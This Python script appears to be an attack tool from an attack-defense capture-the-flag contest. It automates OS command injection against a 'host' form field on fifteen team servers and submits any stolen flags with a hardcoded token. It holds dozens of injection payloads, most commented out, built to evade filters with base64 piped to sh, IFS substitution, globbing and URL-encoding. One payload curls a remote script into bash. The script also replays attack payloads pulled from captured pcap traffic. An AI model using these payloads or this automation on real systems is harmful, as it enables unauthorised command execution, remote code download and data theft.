import subprocess
import os

payloads = []

# payloads.append(' cat /www/flag')
# payloads.append('; cat /w*/flag')
# payloads.append('%3B+cat+..%2Fflag')
# payloads.append('1 hoge;a=fl;cat /www/${a}ag')
# payloads.append('| cat - /www/f*')
# payloads.append('|echo Y2F0IC93d3cvZmxhZwo=|base64 -d|sh ')
# payloads.append('; more ../flag')
# payloads.append(';less ../f*g')
# payloads.append('&&less ../f*g')
# payloads.append('&less ../f*g')
# payloads.append('10.10.10.1; cat /ww# w/flag')
# payloads.append('10.10.10.1; && cat /www/flag')
# payloads.append('10.0.3.2; cat /./././w*/././././f*')
# payloads.append('10.0.3.2| cat /./././w*/././././f*')

# payloads.append(' \r asd;cat /www/././flag \r\n\r\n')
# payloads.append(' ;/b?n/c?t /*/?l?g')
# payloads.append(' `cat /w*/flag`')
# payloads.append('; more ../flag')
# payloads.append('%3b%20%6c%65%73%73%20%2e%2e%2f%66%2a%67')
# payloads.append(';ls;cd /; (nohup python3 -m http.server 8000 &)')
# payloads.append('\ncat${IFS}/www/flaghost=;cat /www/flag')
# payloads.append(';      cat /www/flag')
# payloads.append('; more ../f*g')

# payloads.append('00;cat /www/flag')
# payloads.append(' asd;cat /www/flag')

# payloads.append('\n curl -k https://10.0.2.100:2137/s | bash')
# payloads.append('| cat - /w*/flag&submit=Submit Query')
# payloads.append('&more ../f*g')
# payloads.append('&strings ../f*g')
# payloads.append('10.10.10.1; cat /www/flag&submit=submit\n')


payloads.append('cat /www/f*&submit=Submit Query')
# payloads.append(' asd;cat /www/flag\n&submit=send')


import dpkt
import argparse
from urllib.parse import unquote

counter = 0
# filename='2017-12-08_14:09:20.pcap'
# filename='2017-12-08_14:24:20.pcap'
# filename='2017-12-08_14:39:20.pcap'
filename='2017-12-08_15:04:21.pcap'
payload = []

for ts, pkt in dpkt.pcap.Reader(open(filename,'rb')):

    counter += 1 

    eth = dpkt.ethernet.Ethernet(pkt) 
    if eth.type!=dpkt.ethernet.ETH_TYPE_IP :
       continue

    ip = eth.data
    tcp = ip.data
    
    
    if ip.p == dpkt.ip.IP_PROTO_TCP and tcp.data != b'': 
        try :
            data = str(tcp.data)[2:]
            if 'host' in data :
                host = data.split('host=')[1]
                host = host.strip().strip('\'')
                payload.append(unquote(host).replace('+',' '))
                
        except :
        #    print( "error" , tcp.data)
            pass

# payloads.append('cat /ww*/f*')
payloads += payload

flags = []
token = '294d34acf11783a50f0fe3a51db8aef4'

group = list(range(1,16))
# group.remove(12)
print(len(payloads))
for f,p in enumerate(payloads):
    # print(group)
    print(f)
    for i in group:
        # print(i)
        stdoutdata = subprocess.getoutput("curl -s 'http://10.0.{}.2/warmup/' -d 'host={}&sumbit=Submit Query'".format(i,p))
        
        # stdoutdata = subprocess.getoutput("curl -s 'http://10.0.{}.2/warmup/' -d 'host={}&submit=Submit Query".format(i,p))

        # | cat - /w*/flag&submit=Submit Query
            
        # print(result)
        # print(stdoutdata)
        if "detected!" in stdoutdata :
            print(i,"Failed")
        else :
            # group.remove(i)
            # print(stdoutdata)
            flag = stdoutdata.split('\n')[-1]
            if flag == '<pre>' :
                print("Useless")
                continue
            stdout = subprocess.getoutput("curl 'http://10.10.10.1/team/submit_key?token={}&key={}'".format(token,flag))
            result = stdout.split('\n')[-1]
            flags.append(flag)
            if 'Congratulations!' in result :
                print(flag,result)
                print(p)
                group.remove(i)
            elif 'You have submitted' in result:
                group.remove(i)
                print("repeat")
                print(p)
            elif 'wrong' in result:
                # print(stdoutdata)
                print("get wrong flag")
            else :
                print(result)
                print("???")
